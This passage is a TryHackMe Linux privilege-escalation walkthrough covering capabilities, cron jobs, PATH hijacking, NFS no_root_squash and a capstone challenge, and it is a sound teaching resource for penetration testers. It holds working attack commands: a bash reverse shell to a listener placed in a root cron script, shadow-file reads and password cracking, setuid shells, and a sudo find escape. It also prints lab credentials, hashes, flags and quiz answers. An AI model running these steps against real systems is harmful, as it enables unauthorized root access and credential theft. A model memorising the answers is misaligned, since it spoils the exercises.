# Using vim
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
whoami
root
```

##### Find flag4.txt
```bash
find / -name flag4.txt 2>/dev/null
/home/ubuntu/flag4.txt

cat /home/ubuntu/flag4.txt
THM-9349843
```

```
Complete the task described above on the target system
> No answer needed
```

```
How many binaries have set capabilities?
> 6
```

```
What other binary can be used through its capabilities?
> view
```

```
What is the content of the flag4.txt file?
> THM-9349843
```

## Task 9 - Privilege Escalation: Cron Jobs 

Note: Launch the target machine attached to this task to follow along.
You can launch the target machine and access it directly from your browser.
Alternatively, you can access it over SSH with the low-privilege user credentials below:

* Username: karen
* Password: Password1

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under ```/etc/crontab```

While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.
![](https://i.imgur.com/fwqPuHN.png)

You can see the ```backup.sh``` script was configured to run every minute. The content of the file shows a simple script that creates a backup of the prices.xls file.
![](https://i.imgur.com/qlDj93R.png)

As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges.

The script will use the tools available on the target system to launch a reverse shell.
Two points to note;
1. The command syntax will vary depending on the available tools. (e.g. ```nc``` will probably not support the ```-e``` option you may have seen used in other cases)
2. We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.

The file should look like this;
![](https://i.imgur.com/579yg6H.png)

We will now run a listener on our attacking machine to receive the incoming connection.
![](https://i.imgur.com/xwYXfY1.png)

Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:
1. System administrators need to run a script at regular intervals.
2. They create a cron job to do this
3. After a while, the script becomes useless, and they delete it
4. They do not clean the relevant cron job

This change management issue leads to a potential exploit leveraging cron jobs.
![](https://i.imgur.com/SovymJL.png)

The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.
If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.

The file on the target system should look familiar:
![](https://i.imgur.com/SHknR87.png)

The incoming reverse shell connection has root privileges:
![](https://i.imgur.com/EBCue17.png)

In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.

##### Check Cronjobs
```bash
cat /etc/crontab

* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

##### Check For Scripts
```bash
ls -la /antivirus.sh
ls: cannot access '/antivirus.sh': No such file or directory

ls -la /tmp/test.py
ls: cannot access '/tmp/test.py': No such file or directory

ls -la /home/karen/backup.sh
-rw-r--r-- 1 karen karen 77 Jun 20 10:21 /home/karen/backup.sh

find / -name antivirus.sh 2>/dev/null
<noting>
```

##### Establish nc Listener.
```bash
nc -lnvp 4444
```

##### Check For Python
```bash
which python
<nothing>

python
-sh: 19: python: not found
```

##### Establish Reverse Shell with Bash Script
```bash
env
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

nano /home/karen/backup.sh


# Found Contents
#!/bin/bash
cd /home/admin/1/2/3/Results
zip -r /home/admin/download.zip ./*


# Update File.
#!/bin/bash
bash -i >& /dev/tcp/10.10.199.16/4444 0>&1


chmod +x /home/karen/backup.sh
```

##### Get flag5.txt
```bash
find / -name flag5.txt 2>/dev/null
/home/ubuntu/flag5.txt

cat /home/ubuntu/flag5.txt
THM-383000283
```

##### Get Matt's Password
```bash
cat /etc/passwd
matt:x:1002:1002::/home/matt:/bin/sh

cat /etc/shadow
matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::


nano shadow.txt
copy > matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
123456
```

```
How many cron jobs can you see on the target system?
> 4
```

```
What is the content of the flag5.txt file?
> THM-383000283
```

```
What is Matt's password?
> 123456
```

## Task 10 - Privilege Escalation: PATH 

Note: Launch the target machine attached to this task to follow along.
You can launch the target machine and access it directly from your browser.
Alternatively, you can access it over SSH with the low-privilege user credentials below:

* Username: karen
* Password: Password1
* 
If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable were are talking about here, path is the location of a file).

Typically the PATH will look like this:
![](https://i.imgur.com/ch2Z4zp.png)

If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.
1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

For demo purposes, we will use the script below:
![](https://i.imgur.com/qX7m2Jq.png)

This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.

We compile this into an executable and set the SUID bit.
![](https://i.imgur.com/A6QQ65I.png)

Our user now has access to the “path” script with SUID bit set.
![](https://i.imgur.com/Af1RpuY.png)

Once executed “path” will look for an executable named “thm” inside folders listed under PATH.

If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege

A simple search for writable folders can done using the “```find / -writable 2>/dev/null```” command. The output of this command can be cleaned using a simple cut and sort sequence.
![](https://i.imgur.com/7UekB3t.png)

Some CTF scenarios can present different folders but a regular system would output something like we see above.
Comparing this with PATH will help us find folders we could use.
![](https://i.imgur.com/67mdmmG.png)

We see a number of folders under /usr, thus it could be easier to run our writable folder search once more to cover subfolders.
![](https://i.imgur.com/Y3pDsrL.png)

An alternative could be the command below.
```find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u```
We have added “grep -v proc” to get rid of the many results related to running processes.

Unfortunately, subfolders under /usr are not writable

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “```export PATH=/tmp:$PATH```” command accomplishes this.
![](https://i.imgur.com/u1PM8ZD.png)

At this point the path script will also look under the /tmp folder for an executable named “thm”.
Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.
![](https://i.imgur.com/7UdrEnd.png)

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.
![](https://i.imgur.com/MlBJ8kb.png)

##### Enumerate
```bash
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
dev/char
dev/fd
dev/full
dev/fuse
dev/log
dev/mqueue
dev/net
dev/null
dev/ptmx
dev/pts
dev/random
dev/shm
dev/stderr
dev/stdin
dev/stdout
dev/tty
dev/urandom
dev/zero
etc/udev
home/murdoch
run/acpid.socket
run/dbus
run/lock
run/screen
run/shm
run/snapd-snap.socket
run/snapd.socket
run/systemd
run/user
run/uuidd
snap/core
snap/core18
snap/core20
sys/fs
sys/kernel
tmp
tmp/.ICE-unix
tmp/.Test-unix
tmp/.X11-unix
tmp/.XIM-unix
tmp/.font-unix
usr/lib
var/crash
var/lock
var/tmp

ls -la /home/murdoch
-rwsr-xr-x 1 root root 16712 Jun 20 12:23 test
-rw-rw-r-- 1 root root    86 Jun 20 17:48 thm.py

/home/murdoch/test
/home/murdoch/test: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1724ca90b94176ea2eb867165e837125e8e5ca52, for GNU/Linux 3.2.0, not stripped
```

##### Enumerate Privileges
```bash
export PATH=/tmp:$PATH
echo "/bin/bash" > /tmp/thm
chmod +x /tmp/thm
./test
```

##### Get flag6.txt
```bash
find / -name flag6.txt 2>/dev/null
/home/matt/flag6.txt

cat /home/matt/flag6.txt
THM-736628929
```

```
What is the odd folder you have write access for?
> home/murdoch
```

```
Exploit the $PATH vulnerability to read the content of the flag6.txt file.
> No answer needed
```

```
What is the content of the flag6.txt file?
> THM-736628929
```

## Task 11 - Privilege Escalation: NFS 

Note: Launch the target machine attached to this task to follow along.
You can launch the target machine and access it directly from your browser.
Alternatively, you can access it over SSH with the low-privilege user credentials below:

* Username: karen
* Password: Password1

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.

Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
![](https://i.imgur.com/irDQTze.png)

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.
![](https://i.imgur.com/CmXPDcv.png)

We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.
![](https://i.imgur.com/DwAB1qs.png)

As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.
![](https://i.imgur.com/nWKpFkK.png)

Once we compile the code we will set the SUID bit.
![](https://i.imgur.com/rkZOOjZ.png)

You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).
![](https://i.imgur.com/U7IjT38.png)

Notice the nfs executable has the SUID bit set on the target system and runs with root privileges.

```bash
showmount -e 10.10.102.63
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *

cat /etc/exports
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)

mkdir /tmp/shared
mount -o rw 10.10.102.63:/home/ubuntu/sharedfolder/ /tmp/shared
```

```bash
# From NFS
cd /tmp/shared
nano nfs.c
<copy code>
gcc nfs.c -o nfs -w
chmod +s nfs

# From SSH
cd /home/ubuntu/sharedfolder
./nfs
find / -name flag7.txt 2>/dev/null
/home/matt/flag7.txt
cat /home/matt/flag7.txt
THM-89384012
```


```
How many mountable shares can you identify on the target system?
> 3
```

```
How many shares have the "no_root_squash" option enabled?
> 3
```

```
Gain a root shell on the target system
> No answer needed
```

```
What is the content of the flag7.txt file?
> THM-89384012
```

## Task 12 - Capstone Challenge 

By now you have a fairly good understanding of the main privilege escalation vectors on Linux and this challenge should be fairly easy.

You have gained SSH access to a large scientific facility. Try to elevate your privileges until you are Root.
We designed this room to help you build a thorough methodology for Linux privilege escalation that will be very useful in exams such as OSCP and your penetration testing engagements.

Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.

You can access the target machine over your browser or use the SSH credentials below.
* Username: leonard
* Password: Penny123

##### Where Am I?
```bash
pwd
/home/leonard

ls -la /home

drwxr-xr-x.  5 root    root      50 Jun  7 21:14 .
dr-xr-xr-x. 18 root    root     235 Jun  7 23:09 ..
drwx------.  7 leonard leonard  197 Jun  7 21:15 leonard
drwx------. 16 missy   missy   4096 Jun  7 21:16 missy
drwx------.  2 root    root      23 Jun  7 21:15 rootflag
```

##### Check Kernel Version
```bash
cat /proc/version

Linux version 3.10.0-1160.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Mon Oct 19 16:18:59 UTC 2020


searchsploit Linux 3.10 | grep "Local Privilege Escalation"

Exim < 4.86.2 - Local Privilege Escalation                                                                                                                        | linux/local/39549.txt
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                                                                         | solaris/local/15962.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                                                                                 | linux/local/50135.c
Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - 'Mutagen Astronomy' Local Privilege Escalation                                            | linux_x86-64/local/45516.c
Linux Kernel 3.10.0-514.21.2.el7.x86_64 / 3.10.0-514.26.1.el7.x86_64 (CentOS 7) - SUID Position Independent Executable 'PIE' Local Privilege Escalation           | linux/local/42887.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                                                            | linux_x86-64/local/31347.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                                                                        | linux/local/41886.c
Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                                                                                                 | linux/local/34923.c
Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation                                                                                      | linux_x86-64/local/44302.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation                                                                                 | linux/local/45553.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                                     | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                            | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                                                 | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                             | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                         | linux/local/47169.c
Nagios < 4.2.4 - Local Privilege Escalation                                                                                                                       | linux/local/40921.sh
NfSen < 1.3.7 / AlienVault OSSIM < 5.3.6 - Local Privilege Escalation                                                                                             | linux/local/42305.txt
Oracle VM VirtualBox < 5.0.32 / < 5.1.14 - Local Privilege Escalation                                                                                             | linux/local/41196.txt
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1)                                                                                                       | linux/local/47009.c
systemd (systemd-tmpfiles) < 236 - 'fs.protected_hardlinks=0' Local Privilege Escalation                                                                          | linux/local/43935.txt
UCOPIA Wireless Appliance < 5.1.8 - Local Privilege Escalation                                                                                                    | linux/local/42936.md
```

##### Try linux_x86-64/local/45516.c
```bash
cd /dev/shm

nano poc-exploit.c
# Copy code.
gcc poc-exploit.c -o poc-exploit
chmod +x poc-exploit

nano poc-suidbin.c
# Copy code.
gcc poc-suidbin.c -o poc-suidbin
chmod +x poc-suidbin

./poc-exploit

# Failed.
died in main: 210
```

##### Check sudo
```bash
sudo -l

Sorry, user leonard may not run sudo on ip-10-10-251-141.
```

##### Check SUID Binaries
```bash
find / -type f -perm -04000 -ls 2>/dev/null

16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
37709347   12 -rwsr-xr-x   1 root     root        11128 Oct 13  2020 /usr/libexec/kde4/kpac_dhcp_helper
51455908   60 -rwsr-x---   1 root     dbus        57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper                     
17836404   16 -rwsr-xr-x   1 root     root        15448 Apr  1  2020 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper    
18393221   16 -rwsr-xr-x   1 root     root        15360 Oct  1  2020 /usr/libexec/qemu-bridge-helper                                   
37203442  156 -rwsr-x---   1 root     sssd       157872 Oct 15  2020 /usr/libexec/sssd/krb5_child                                      
37203771   84 -rwsr-x---   1 root     sssd        82448 Oct 15  2020 /usr/libexec/sssd/ldap_child                                      
37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child                                   
37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child                                     
18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache          
18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap
```

##### Get Users
```bash
cat /etc/passwd | grep "/bin/bash"

root:x:0:0:root:/root:/bin/bash
leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
missy:x:1001:1001::/home/missy:/bin/bash
```

##### Use SUID Binary base64 to get shadow file.
```bash
base64 /etc/shadow | base64 -d
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```

##### Try to crack root and missy's passwords.
```bash
nano passwd.txt
nano shadow.txt

# Unshadow into passwords.txt
unshadow passwd.txt shadow.txt > passwords.txt

# Try to crack passwords with John The Ripper.
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt

Password1        (missy) 
```

##### su to Missy.
```bash
su missy
Password1

cd /home/missy
ls -l Documents
-rw-r--r--. 1 missy missy 19 Jun  7 21:12 flag1.txt

cat Documents/flag1.txt
THM-42828719920544
```

##### Check Capabilities.
```bash
getcap -r / 2>/dev/null

/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep

# Nothing on GTFObins.
```

##### Check Cronjobs.
```bash
cat /etc/crontab
# Nothing
```

##### Check NFS.
```bash
cat /etc/exports
# Nothing
```

##### Enumerate with Linpeas.
```bash
cd /dev/shm
wget http://10.13.25.242/linpeas.sh
chmod +x linpeas.sh

User missy may run the following commands on ip-10-10-251-141:
    (ALL) NOPASSWD: /usr/bin/find
```

##### GTFObins - find.
```bash
sudo find . -exec /bin/sh \; -quit
# root access.
cd /home/rootflag
ls
flag2.txt
cat flag2.txt
THM-168824782390238
```

```
What is the content of the flag1.txt file?
> THM-42828719920544
```

```
What is the content of the flag2.txt file?
> THM-168824782390238
```

## Additional Resources
[LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

[LinEnum](https://github.com/rebootuser/LinEnum)
    
[LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
    
[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

[Linux Priv Checker](https://github.com/linted/linuxprivchecker )

https://www.linuxkernelcves.com/cves

https://gtfobins.github.io/

https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/